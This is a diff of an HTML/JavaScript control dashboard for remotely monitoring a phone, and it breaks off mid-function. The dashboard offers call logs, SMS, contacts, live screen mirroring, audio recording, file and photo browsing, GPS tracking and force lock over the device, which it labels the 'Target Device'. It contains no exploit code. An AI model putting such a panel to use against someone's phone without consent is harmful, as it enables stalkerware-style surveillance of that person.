@@ -3,553 +3,360 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RS Phone - Command Center</title>
+    <title>RS Phone - Command Center V2</title>
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #121212; padding: 15px; padding-bottom: 40px; color: #ffffff; }
+        /* ==================== CORE RESET & TYPOGRAPHY ==================== */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
+        body { background-color: #121212; color: #ffffff; padding: 15px; padding-bottom: 40px; }
         
-        .header { text-align: center; margin-bottom: 20px; }
-        .header h2 { font-size: 22px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; color: #ffffff; }
-        .device-selector { width: 100%; padding: 12px; margin-top: 15px; border-radius: 4px; border: 1px solid #333; background: #1e1e1e; color: white; font-size: 16px; outline: none; margin-bottom: 15px; }
+        .header { display: flex; flex-direction: column; gap: 10px; margin-bottom: 25px; border-bottom: 1px solid #333; padding-bottom: 15px; }
+        .header h2 { font-size: 24px; font-weight: 800; text-transform: uppercase; letter-spacing: 1.5px; color: #ffffff; }
+        .device-selector { background: #1e1e1e; color: white; border: 1px solid #444; border-radius: 6px; padding: 12px; font-size: 15px; outline: none; width: 100%; font-weight: bold; }
 
-        /* 🚀 ENTERPRISE UPGRADE: Clickable Section Master Headers */
-        .section-header { 
-            font-size: 15px; 
-            font-weight: 700; 
-            color: #3498db; 
-            text-transform: uppercase; 
-            letter-spacing: 1.5px; 
-            margin: 18px 0 8px 0; 
-            display: flex; 
-            align-items: center; 
-            justify-content: space-between;
-            background: #1c2833;
-            padding: 14px 12px;
-            border-radius: 4px;
-            border-left: 4px solid #3498db;
-            cursor: pointer;
-            user-select: none;
-            transition: background 0.2s ease;
-        }
-        .section-header:hover { background: #243342; }
-        .section-header-left { display: flex; align-items: center; gap: 10px; }
-        .toggle-icon { font-size: 12px; transition: transform 0.3s ease; color: #3498db; }
-
-        /* 🚀 SMART DISPLAY CONTAINER LAYOUT */
-        .section-content { 
-            display: none; 
-            flex-direction: column; 
-            gap: 12px; 
-            margin-top: 8px;
-            padding-left: 2px;
-        }
-        .section-content.expanded { display: flex; }
-        .section-header.active .toggle-icon { transform: rotate(90deg); }
-
-        .card-container { display: flex; flex-direction: column; gap: 12px; }
+        /* ==================== VITAL BOXES GRID (3 Boxes + 1 Orb) ==================== */
+        .vitals-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-bottom: 25px; }
         
-        .flat-card {
-            display: flex; flex-direction: column; justify-content: center;
-            padding: 22px 20px; border-radius: 4px; color: white; 
-            text-decoration: none; position: relative; overflow: hidden;
-            border-bottom: 3px solid rgba(0,0,0,0.3);
-            cursor: pointer;
-        }
+        .vital-box { background: #1e1e1e; border-radius: 8px; padding: 15px; display: flex; flex-direction: column; justify-content: center; position: relative; overflow: hidden; border: 1px solid #2a2a2a; }
+        .vital-icon { color: #888; margin-bottom: 8px; }
+        .vital-title { font-size: 12px; color: #aaa; text-transform: uppercase; font-weight: 600; letter-spacing: 0.5px; }
+        .vital-value { font-size: 20px; font-weight: 800; margin-top: 5px; }
         
-        .card-content { display: flex; align-items: center; justify-content: space-between; width: 100%; }
-        .card-left { display: flex; align-items: center; gap: 16px; z-index: 2; }
-        .card-icon { width: 42px; height: 42px; opacity: 0.9; }
-        .card-text { display: flex; flex-direction: column; }
-        .card-title { font-size: 18px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
-        .card-subtitle { font-size: 13px; opacity: 0.8; margin-top: 4px; font-weight: 400; }
+        .box-blue { border-left: 4px solid #3498db; }
+        .box-green { border-left: 4px solid #2ecc71; }
+        .box-purple { border-left: 4px solid #9b59b6; }
+
+        /* ==================== THE SYSTEM HEALTH ORB ==================== */
+        .health-box { background: #1a1a1a; border-radius: 8px; padding: 15px; display: flex; align-items: center; justify-content: space-between; border: 1px solid #333; grid-column: span 2; }
         
-        .card-right { text-align: right; z-index: 2; }
-        .metric-value { font-size: 28px; font-weight: 700; }
-        .metric-label { font-size: 12px; opacity: 0.8; text-transform: uppercase; }
-
-        .action-row { display: flex; gap: 10px; margin-top: 15px; width: 100%; z-index: 2; flex-wrap: wrap; }
-        .btn { flex: 1; padding: 12px; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; text-transform: uppercase; cursor: pointer; background: rgba(255,255,255,0.2); color: white; transition: background 0.2s; text-align: center; }
-        .btn:active { background: rgba(0,0,0,0.3); }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .health-left { display: flex; align-items: center; gap: 15px; }
         
-        .btn-danger { background: rgba(231, 76, 60, 0.8); }
-        .btn-warning { background: rgba(241, 196, 15, 0.8); color: #000; }
-        .btn-success { background: rgba(46, 204, 113, 0.8); }
+        .orb { width: 24px; height: 24px; border-radius: 50%; transition: all 0.3s ease; }
+        .orb-green { background: #2ecc71; box-shadow: 0 0 15px #2ecc71, 0 0 30px #2ecc71; animation: levitate 2s infinite ease-in-out; }
+        .orb-red { background: #e74c3c; box-shadow: 0 0 20px #e74c3c, 0 0 40px #e74c3c; animation: fastBlink 0.6s infinite; }
+        
+        .health-text { font-size: 14px; font-weight: bold; letter-spacing: 1px; text-transform: uppercase; }
+        .settings-btn { background: rgba(255,255,255,0.1); border: none; color: white; border-radius: 50%; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; }
+        .settings-btn:hover { background: rgba(52, 152, 219, 0.5); transform: rotate(45deg); }
 
-        .bg-icon { position: absolute; right: -20px; top: -10px; width: 120px; height: 120px; opacity: 0.1; z-index: 1; transform: rotate(-15deg); }
+        @keyframes levitate { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
+        @keyframes fastBlink { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.9); } }
 
-        .bg-dark { background-color: #2c3e50; }
-        .bg-red { background-color: #e74c3c; }
-        .bg-green { background-color: #2ecc71; }
-        .bg-blue { background-color: #2980b9; }
-        .bg-teal { background-color: #1abc9c; }
-        .bg-purple { background-color: #8e44ad; }
-        .bg-indigo { background-color: #3f51b5; }
-        .bg-orange { background-color: #d35400; }
-        .bg-emerald { background-color: #27ae60; }
-        .bg-cyan { background-color: #00bcd4; }
-        .bg-bluegrey { background-color: #607d8b; }
-        .bg-grey { background-color: #424242; }
+        /* ==================== VAULT GATEWAYS (4 Main Options) ==================== */
+        .vault-grid { display: flex; flex-direction: column; gap: 14px; }
+        
+        .vault-card { background: #242424; border-radius: 8px; padding: 20px; display: flex; align-items: center; justify-content: space-between; text-decoration: none; color: white; transition: all 0.2s; border: 1px solid #333; position: relative; overflow: hidden; }
+        .vault-card:hover { transform: translateY(-3px); background: #2a2a2a; border-color: #555; }
+        .vault-card:active { transform: translateY(0); }
+        
+        .vault-left { display: flex; align-items: center; gap: 15px; z-index: 2; }
+        .vault-icon { width: 32px; height: 32px; opacity: 0.9; }
+        .vault-title { font-size: 16px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
+        .vault-desc { font-size: 12px; color: #aaa; margin-top: 4px; }
+        
+        .gate-blue .vault-icon { color: #3498db; }
+        .gate-red .vault-icon { color: #e74c3c; }
+        .gate-green .vault-icon { color: #2ecc71; }
+        .gate-yellow .vault-icon { color: #f1c40f; }
 
-        .live-stream-viewport {
-            width: 100%; height: 240px; background: #000; border-radius: 4px;
-            margin-top: 12px; display: none; align-items: center; justify-content: center;
-            border: 2px dashed #1abc9c; position: relative;
-        }
-        .live-stream-canvas { width: 100%; height: 100%; object-fit: contain; }
+        /* ==================== MODAL STYLES ==================== */
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; justify-content: center; align-items: center; padding: 20px; backdrop-filter: blur(4px); }
+        .modal-content { background: #1e1e1e; width: 100%; max-width: 400px; border-radius: 10px; padding: 25px; border: 1px solid #333; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 15px; }
+        .modal-header h3 { font-size: 18px; color: #3498db; text-transform: uppercase; letter-spacing: 1px; }
+        .close-btn { background: none; border: none; color: #fff; font-size: 24px; cursor: pointer; transition: 0.2s; }
+        .close-btn:hover { color: #e74c3c; }
     </style>
 </head>
 <body>
 
+    <!-- ================================================================================= -->
+    <!-- HEADER & SELECTOR                                                                 -->
+    <!-- ================================================================================= -->
     <div class="header">
         <h2>Command Center</h2>
-        <!-- 🚀 FIXED: The primary target selection selector node for DashboardEngine -->
         <select id="device-select" class="device-selector">
-            <option value="">Loading active contexts...</option>
+            <option value="">Loading Neural Links...</option>
         </select>
     </div>
 
     <!-- ================================================================================= -->
-    <!-- DIAGNOSTICS & SYSTEM MATRIX (VITAL STATS ALWAYS VISIBLE)                          -->
+    <!-- VITALS & HEALTH ORB GRID                                                          -->
     <!-- ================================================================================= -->
-    <div class="card-container">
-        <!-- 1. Connection & System Info -->
-        <div class="flat-card bg-dark">
-            <i data-lucide="radio" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="smartphone" class="card-icon"></i>
-                    <!-- 🚀 FIXED: Dynamic targeting tags perfectly synced with dashboard.js -->
-                    <div class="card-text" id="info-name">
-                        <span class="card-title">Device Name</span>
-                    </div>
-                </div>
-                <div class="card-right">
-                    <span class="metric-label" id="online-badge" style="font-weight: bold;">○ OFFLINE</span>
-                </div>
-            </div>
+    <div class="vitals-grid">
+        <!-- Box 1: Device / Status -->
+        <div class="vital-box box-blue">
+            <i data-lucide="smartphone" class="vital-icon"></i>
+            <span class="vital-title">Target Device</span>
+            <span class="vital-value" id="ui-device-name">Waiting...</span>
         </div>
 
-        <!-- 2. Diagnostics & Settings Check -->
-        <div class="flat-card bg-grey" onclick="openSettingsCheckModal()" style="border-left: 5px solid #3498db;">
-            <i data-lucide="settings" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="activity" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">Settings Check</span>
-                        <span class="card-subtitle">Permissions Matrix & Remote Config</span>
-                    </div>
-                </div>
-                <div class="card-right">
-                    <div class="metric-value" style="font-size: 18px; color: #3498db;">VERIFY</div>
-                </div>
-            </div>
+        <!-- Box 2: Battery Core -->
+        <div class="vital-box box-green" id="ui-battery-box">
+            <i data-lucide="battery" class="vital-icon" id="ui-battery-icon"></i>
+            <span class="vital-title" id="ui-battery-state">Power</span>
+            <span class="vital-value" id="ui-battery-val">--%</span>
         </div>
 
-        <!-- 3. Battery -->
-        <div class="flat-card bg-red" id="battery-card">
-            <i data-lucide="battery-charging" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="battery" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">Battery</span>
-                        <span class="card-subtitle" id="battery-state">Analyzing</span>
-                    </div>
-                </div>
-                <div class="card-right">
-                    <div class="metric-value" id="metric-battery">0%</div>
-                </div>
-            </div>
+        <!-- Box 3: Storage / System -->
+        <div class="vital-box box-purple">
+            <i data-lucide="hard-drive" class="vital-icon"></i>
+            <span class="vital-title">Storage Used</span>
+            <span class="vital-value" id="ui-storage-val">--GB</span>
         </div>
 
-        <!-- 4. Storage -->
-        <div class="flat-card bg-purple">
-            <i data-lucide="hard-drive" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="database" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">Storage</span>
-                        <span class="card-subtitle">Internal Drive</span>
-                    </div>
-                </div>
-                <div class="card-right">
-                    <div class="metric-value" id="metric-storage">0GB</div>
-                    <div class="metric-label">Used</div>
-                </div>
+        <!-- The 4th Block: Glowing Health Orb & Settings Gear -->
+        <div class="health-box">
+            <div class="health-left">
+                <div id="ui-health-orb" class="orb orb-red"></div>
+                <div class="health-text" id="ui-health-text" style="color: #e74c3c;">SYSTEM OFFLINE</div>
             </div>
-        </div>
-
-        <!-- 5. Operations Vault -->
-        <a href="/ops" class="flat-card bg-blue" style="text-decoration: none; border-left: 5px solid #00d2d3;">
-            <i data-lucide="terminal" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="activity" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">Operations Vault</span>
-                        <span class="card-subtitle">Live Status of Executed Commands</span>
-                    </div>
-                </div>
-                <div class="card-right"><div class="metric-value">></div></div>
-            </div>
-        </a>
-    </div>
-
-    <!-- ================================================================================= -->
-    <!-- SECTION 1: COMMUNICATION HUB (COLLAPSIBLE)                                       -->
-    <!-- ================================================================================= -->
-    <div class="section-header" onclick="toggleLayoutSection(this, 'sec-comm-hub')">
-        <div class="section-header-left">
-            <i data-lucide="message-circle" style="width: 18px; height: 18px;"></i>
-            <span>Communication Hub</span>
-        </div>
-        <span class="toggle-icon">▶</span>
-    </div>
-    
-    <div class="section-content" id="sec-comm-hub">
-        <!-- Phone Calls Log -->
-        <a href="/calls" class="flat-card bg-indigo" style="text-decoration: none;">
-            <i data-lucide="phone-call" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="phone" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">Phone Calls</span>
-                        <span class="card-subtitle">Call Logs & History</span>
-                    </div>
-                </div>
-                <div class="card-right"><div class="metric-value">></div></div>
-            </div>
-        </a>
-
-        <!-- SMS Messages -->
-        <a href="/messages" class="flat-card bg-emerald" style="text-decoration: none;">
-            <i data-lucide="message-square" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="mail" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">SMS Messages</span>
-                        <span class="card-subtitle">Inbox & Outbox Sync</span>
-                    </div>
-                </div>
-                <div class="card-right"><div class="metric-value">></div></div>
-            </div>
-        </a>
-
-        <!-- Address Book / Contacts -->
-        <a href="/contacts" class="flat-card bg-orange" style="text-decoration: none;">
-            <i data-lucide="users" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="book-open" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">Address Book</span>
-                        <span class="card-subtitle">Live Contacts Sync</span>
-                    </div>
-                </div>
-                <div class="card-right"><div class="metric-value">></div></div>
-            </div>
-        </a>
-
-        <!-- Live Notifications Portal Gate -->
-        <a href="/notifications" class="flat-card bg-purple" style="text-decoration: none; border-left: 5px solid #9b59b6;">
-            <i data-lucide="bell" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="bell-ring" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">Live Notifications</span>
-                        <span class="card-subtitle">App Alerts & Status Telemetry Stream</span>
-                    </div>
-                </div>
-                <div class="card-right"><div class="metric-value">></div></div>
-            </div>
-        </a>
-    </div>
-
-    <!-- ================================================================================= -->
-    <!-- SECTION 2: REMOTE OPERATIONS CENTER (COLLAPSIBLE)                                 -->
-    <!-- ================================================================================= -->
-    <div class="section-header" onclick="toggleLayoutSection(this, 'sec-remote-ops')">
-        <div class="section-header-left">
-            <i data-lucide="cpu" style="width: 18px; height: 18px;"></i>
-            <span>Remote Operations Center</span>
-        </div>
-        <span class="toggle-icon">▶</span>
-    </div>
-
-    <div class="section-content" id="sec-remote-ops">
-        <!-- WebSocket Live Screen Sharing Engine UI Component -->
-        <div class="flat-card bg-blue">
-            <i data-lucide="monitor" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="tv" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">Live Screen Mirroring</span>
-                        <span class="card-subtitle">Real-time WebSocket Data Stream (No Cloud Caching)</span>
-                    </div>
-                </div>
-            </div>
-            <div class="action-row">
-                <select id="stream-duration" style="background: rgba(255,255,255,0.2); color: white; border: none; border-radius: 4px; padding: 12px; outline: none; font-weight: bold; flex: 1;">
-                    <option value="1" style="color: black;">1 Min Request</option>
-                    <option value="2" style="color: black;">2 Min Request</option>
-                    <option value="3" style="color: black;">3 Min Request</option>
-                </select>
-                <button class="btn btn-success" id="btn-toggle-stream" onclick="toggleScreenStream()">Start Stream</button>
-            </div>
-            <div class="live-stream-viewport" id="stream-viewport">
-                <div id="stream-placeholder" style="position: absolute; color: #888; font-size: 13px;">Awaiting WebSocket Binary Frame Chunks...</div>
-                <canvas id="stream-canvas" class="live-stream-canvas"></canvas>
-            </div>
-        </div>
-
-        <!-- Live Ops (Media Capture Triggers) -->
-        <div class="flat-card bg-teal">
-            <i data-lucide="cast" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="video" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">Live Ops</span>
-                        <span class="card-subtitle">Remote Media Capture</span>
-                    </div>
-                </div>
-            </div>
-            <div class="action-row">
-                <button class="btn" id="btn-screenshot" onclick="triggerCommand('take_screenshot', 'Screenshot')">Screenshot</button>
-                <div style="display: flex; flex: 1; gap: 5px;">
-                    <select id="audio-duration" style="background: rgba(255,255,255,0.2); color: white; border: none; border-radius: 4px; padding: 5px; outline: none; font-weight: bold;">
-                        <option value="60" style="color: black;">1 Min</option>
-                        <option value="120" style="color: black;">2 Min</option>
-                    </select>
-                    <button class="btn" id="btn-audio" onclick="triggerCommand('record_audio', 'Record Audio')">Record Audio</button>
-                </div>
-            </div>
-        </div>
-
-        <!-- Security & Tactical Ops -->
-        <div class="flat-card bg-pink">
-            <i data-lucide="shield-alert" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="shield" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">Tactical Command</span>
-                        <span class="card-subtitle" id="metric-shield-status">Admin & Emergency Controls</span>
-                    </div>
-                </div>
-            </div>
-            <div class="action-row">
-                <button class="btn btn-warning" onclick="triggerCommand('ring_device', 'Ring Alarm')">Ring Alarm</button>
-                <button class="btn btn-danger" onclick="triggerCommand('call_admin', 'Admin Call')">Admin Call</button>
-                <button class="btn" onclick="triggerCommand('force_lock', 'Force Lock')">Force Lock</button>
-            </div>
-        </div>
-
-        <!-- File Manager -->
-        <a href="/files" class="flat-card bg-bluegrey" style="text-decoration: none;">
-            <i data-lucide="folder-open" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="folder" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">File Manager</span>
-                        <span class="card-subtitle">Browse Device Storage</span>
-                    </div>
-                </div>
-                <div class="card-right"><div class="metric-value">></div></div>
-            </div>
-        </a>
-
-        <!-- Live Media Gallery -->
-        <a href="/gallery" class="flat-card bg-pink" style="text-decoration: none;">
-            <i data-lucide="image" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="camera" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">Live Gallery</span>
-                        <span class="card-subtitle">Rolling 10 Device Photos</span>
-                    </div>
-                </div>
-                <div class="card-right"><div class="metric-value">></div></div>
-            </div>
-        </a>
-    </div>
-
-    <!-- ================================================================================= -->
-    <!-- SECTION 3: DEVICE SAFETY & GEOLOCATION (COLLAPSIBLE)                              -->
-    <!-- ================================================================================= -->
-    <div class="section-header" onclick="toggleLayoutSection(this, 'sec-safety-geo')">
-        <div class="section-header-left">
-            <i data-lucide="map-pin" style="width: 18px; height: 18px;"></i>
-            <span>Safety & Geolocation</span>
-        </div>
-        <span class="toggle-icon">▶</span>
-    </div>
-
-    <div class="section-content" id="sec-safety-geo">
-        <!-- GPS Location -->
-        <a href="/locations" class="flat-card bg-cyan" style="text-decoration: none;">
-            <i data-lucide="map" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="map-pin" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">GPS Location</span>
-                        <span class="card-subtitle">Real-time Device Tracking Matrix</span>
-                    </div>
-                </div>
-                <div class="card-right"><div class="metric-value">></div></div>
-            </div>
-        </a>
-
-        <!-- Smart Geofencing Control Panel Interface -->
-        <div class="flat-card bg-emerald">
-            <i data-lucide="navigation" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="circle-dot" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">Geofence Boundaries</span>
-                        <span class="card-subtitle">Proximity Violations & Safe Zone Map Config</span>
-                    </div>
-                </div>
-                <div class="card-right">
-                    <div class="metric-value" style="font-size: 14px; background: rgba(0,0,0,0.2); padding: 5px 10px; border-radius: 4px;" onclick="location.href='/geofence-config'">SETUP</div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Emergency SOS Interceptor Status Stream -->
-        <div class="flat-card bg-red" style="border-left: 5px solid #fff;">
-            <i data-lucide="alert-triangle" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="alert-circle" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">SOS Critical Monitor</span>
-                        <span class="card-subtitle" id="sos-status-label">Monitoring Panic Signals Matrix</span>
-                    </div>
-                </div>
-                <div class="card-right">
-                    <div class="metric-value" id="metric-sos-badge" style="font-size: 16px; font-weight: bold; color: #fff;">STANDBY</div>
-                </div>
-            </div>
+            <button class="settings-btn" onclick="openSettingsModal()">
+                <i data-lucide="settings"></i>
+            </button>
         </div>
     </div>
 
     <!-- ================================================================================= -->
-    <!-- SECTION 4: APPLICATION POLICY MANAGER (COLLAPSIBLE)                              -->
+    <!-- THE 4 VAULT GATEWAYS                                                              -->
     <!-- ================================================================================= -->
-    <div class="section-header" onclick="toggleLayoutSection(this, 'sec-policy-mgr')">
-        <div class="section-header-left">
-            <i data-lucide="lock" style="width: 18px; height: 18px;"></i>
-            <span>Application Policy Manager</span>
-        </div>
-        <span class="toggle-icon">▶</span>
-    </div>
-
-    <div class="section-content" id="sec-policy-mgr">
-        <!-- Study Hour App Blocker Toggle Console -->
-        <div class="flat-card bg-yellow" style="border-left: 5px solid #d35400;">
-            <i data-lucide="clock" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="timer" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">Study Hour Blocker</span>
-                        <span class="card-subtitle">Restrict Social & Gaming Engine Triggers</span>
-                    </div>
+    <div class="vault-grid">
+        <a href="/communication.html" class="vault-card gate-blue">
+            <div class="vault-left">
+                <i data-lucide="message-square" class="vault-icon"></i>
+                <div>
+                    <div class="vault-title">Communication Hub</div>
+                    <div class="vault-desc">Calls, SMS, Contacts & Notifications</div>
                 </div>
             </div>
-            <div class="action-row">
-                <button class="btn btn-warning" id="btn-study-hour" onclick="toggleStudyHourPolicy()">Toggle Restriction Mode</button>
-            </div>
-        </div>
-
-        <!-- App Usage -->
-        <a href="/usage" class="flat-card bg-yellow" style="text-decoration: none;">
-            <i data-lucide="activity" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="pie-chart" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">App Usage</span>
-                        <span class="card-subtitle">Digital Wellbeing & Limits</span>
-                    </div>
-                </div>
-                <div class="card-right"><div class="metric-value">></div></div>
-            </div>
+            <i data-lucide="chevron-right" style="color:#555;"></i>
         </a>
 
-        <!-- Installed Apps -->
-        <a href="/apps" class="flat-card bg-cyan" style="text-decoration: none;">
-            <i data-lucide="layers" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="grid" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">Installed Apps</span>
-                        <span class="card-subtitle">Device App Directory</span>
-                    </div>
+        <a href="/remote_center.html" class="vault-card gate-red">
+            <div class="vault-left">
+                <i data-lucide="cpu" class="vault-icon"></i>
+                <div>
+                    <div class="vault-title">Remote Ops Center</div>
+                    <div class="vault-desc">Live Screen, Camera, Admin Controls</div>
                 </div>
-                <div class="card-right"><div class="metric-value">></div></div>
             </div>
+            <i data-lucide="chevron-right" style="color:#555;"></i>
         </a>
 
-        <!-- Feature Selection -->
-        <a href="/settings" class="flat-card bg-grey" style="text-decoration: none; border-left: 5px solid #f1c40f;">
-            <i data-lucide="sliders" class="bg-icon"></i>
-            <div class="card-content">
-                <div class="card-left">
-                    <i data-lucide="toggle-right" class="card-icon"></i>
-                    <div class="card-text">
-                        <span class="card-title">Feature Selection</span>
-                        <span class="card-subtitle">Remote ON/OFF Toggles</span>
-                    </div>
+        <a href="/safety.html" class="vault-card gate-green">
+            <div class="vault-left">
+                <i data-lucide="map-pin" class="vault-icon"></i>
+                <div>
+                    <div class="vault-title">Safety & Geolocation</div>
+                    <div class="vault-desc">GPS Tracker, Geofence & SOS Matrix</div>
                 </div>
-                <div class="card-right"><div class="metric-value">></div></div>
             </div>
+            <i data-lucide="chevron-right" style="color:#555;"></i>
+        </a>
+
+        <a href="/policy.html" class="vault-card gate-yellow">
+            <div class="vault-left">
+                <i data-lucide="lock" class="vault-icon"></i>
+                <div>
+                    <div class="vault-title">Policy Manager</div>
+                    <div class="vault-desc">App Blocking & Execution Restraints</div>
+                </div>
+            </div>
+            <i data-lucide="chevron-right" style="color:#555;"></i>
         </a>
     </div>
 
-    <!-- Diagnostics Modal -->
-    <div id="diagnostics-modal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 100; justify-content: center; align-items: center; padding: 20px;">
-        <div style="background: #1e1e1e; width: 100%; max-width: 500px; border-radius: 8px; padding: 20px; max-height: 80vh; overflow-y: auto;">
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 10px;">
-                <h3 style="color: #3498db;">Settings Check</h3>
-                <button onclick="closeSettingsCheckModal()" style="background: none; border: none; color: white; font-size: 20px; cursor: pointer;">&times;</button>
+    <!-- ================================================================================= -->
+    <!-- SETTINGS / PERMISSIONS MODAL                                                      -->
+    <!-- ================================================================================= -->
+    <div class="modal-overlay" id="settings-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>System Architecture Check</h3>
+                <button class="close-btn" onclick="closeSettingsModal()">&times;</button>
             </div>
             <div id="diagnostics-content">
-                <p style="color: #888; text-align: center;">Fetching remote diagnostic data...</p>
+                <p style="color: #aaa; text-align: center; font-size: 13px;">Establishing neural handshake...</p>
             </div>
         </div>
     </div>
 
-    <!-- 🚀 FIXED: Isolated clean UI control script. All data binding hooks are now managed strictly by dashboard.js -->
-    <script> 
-        lucide.createIcons(); 
-        
-        function openSettingsCheckModal() { document.getElementById('diagnostics-modal').style.display = 'flex'; }
-        function closeSettingsCheckModal() { document.getElementById('diagnostics-modal').style.display = 'none'; }
-        
-        // 🚀 DYNAMIC INTERACTIVE ANIMATION ACCORDION LOGIC
-        function toggleLayoutSection(headerEl, sectionId) {
-            headerEl.classList.toggle('active');
-            const content = document.getElementById(sectionId);
-            if (content) {
-                content.classList.toggle('expanded');
+    <!-- ================================================================================= -->
+    <!-- MASTER JAVASCRIPT ENGINE (All logic embedded, NO external files)                  -->
+    <!-- ================================================================================= -->
+    <script>
+        lucide.createIcons();
+
+        class DashboardEngine {
+            constructor() {
+                this.activeDeviceId = localStorage.getItem('active_device_id');
+                this.init();
+            }
+
+            async init() {
+                await this.loadDevicesList();
+                if (!this.activeDeviceId) return; 
+                await this.loadDeviceMetrics();
+                
+                // Telemetry Loop
+                setInterval(() => this.loadDeviceMetrics(), 8000);
+            }
+
+            async loadDevicesList() {
+                const token = localStorage.getItem('owner_token');
+                try {
+                    const res = await fetch('/api/devices', { headers: { 'Authorization': `Bearer ${token}` } });
+                    const result = await res.json();
+
+                    if (result.status === 'success') {
+                        const selectEl = document.getElementById('device-select');
+                        selectEl.innerHTML = ''; 
+                        
+                        if (!result.data || result.data.length === 0) {
+                            selectEl.innerHTML = '<option value="">No Active Nodes</option>';
+                            this.setOfflineState();
+                            return;
+                        }
+
+                        let validDevice = result.data.find(d => d.id == this.activeDeviceId);
+                        if (!validDevice) {
+                            this.activeDeviceId = result.data[0].id;
+                            localStorage.setItem('active_device_id', this.activeDeviceId);
+                            validDevice = result.data[0];
+                        }
+
+                        result.data.forEach(dev => {
+                            const option = document.createElement('option');
+                            option.value = dev.id;
+                            option.textContent = `${dev.name} [ID: ${dev.id.substring(0,4)}]`;
+                            selectEl.appendChild(option);
+                        });
+
+                        selectEl.value = this.activeDeviceId;
+                        
+                        selectEl.addEventListener('change', (e) => {
+                            this.activeDeviceId = e.target.value;
+                            localStorage.setItem('active_device_id', this.activeDeviceId);
+                            this.loadDeviceMetrics(); 
+                        });
+                    }
+                } catch (e) {
+                    console.error("Device Sync Error", e);
+                }
+            }
+
+            async loadDeviceMetrics() {
+                const token = localStorage.getItem('owner_token');
+                if (!this.activeDeviceId) return;
+
+                try {
+                    const res = await fetch('/api/devices', { headers: { 'Authorization': `Bearer ${token}` } });
+                    const result = await res.json();
+                    if (result.status === 'success') {
+                        const dev = result.data.find(d => d.id == this.activeDeviceId);
+                        if (dev) this.updateUI(dev);
+                    }
+                } catch (e) { console.error("Telemetry Error", e); }
+            }
+
+            updateUI(dev) {
+                // Vital 1: Name
+                document.getElementById('ui-device-name').innerText = dev.name || 'Unknown';
+
+                // Vital 2: Battery
